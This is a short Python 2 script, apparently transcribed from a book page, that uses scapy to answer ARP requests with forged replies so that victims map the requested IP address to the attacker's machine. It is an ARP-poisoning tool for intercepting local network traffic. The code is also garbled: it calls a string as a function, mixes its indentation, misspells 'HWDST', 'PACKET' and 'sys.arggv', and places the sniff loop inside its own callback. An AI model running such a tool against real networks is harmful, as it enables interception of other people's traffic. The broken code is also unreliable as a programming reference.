#!/usr/bin/env python

import sys
from scapy.all import sniff, sendp, ARP, Ether

def banner():
   print "------------------------------------------------------------------"
   print "ARP Spoofing tool.  Page 37"

usage = "Examples arpspoof.py <target> <spoof ip>"

def main():
    if not len(sys.argv[1:]):
        usage()

	if len(sys.argv) < 2:
		print sys.argv[0] + " <iface>"
		sys.exit(0)

	def arp_poison_callback (packet):
		#Got ARP request?
		if packet[ARP].op==1:
			answer = Ether(dst=packet[ARP].hwsrc) /ARP()
			answer[ARP].op = "is-at"
			answer[ARP].HWDST = PACKET[ARP].hwsrc
			answer[ARP].psrc = packet[ARP].pdst

			print "Fooling " + packet [ARP].psrc + " that " + \
				packet[ARP].pdst + " is me"

			sendp(answer, iface=sys.arggv[1])

		sniff(prn=arp_poison_callback,
			iface=sys.argv[1],
			store=0)
main()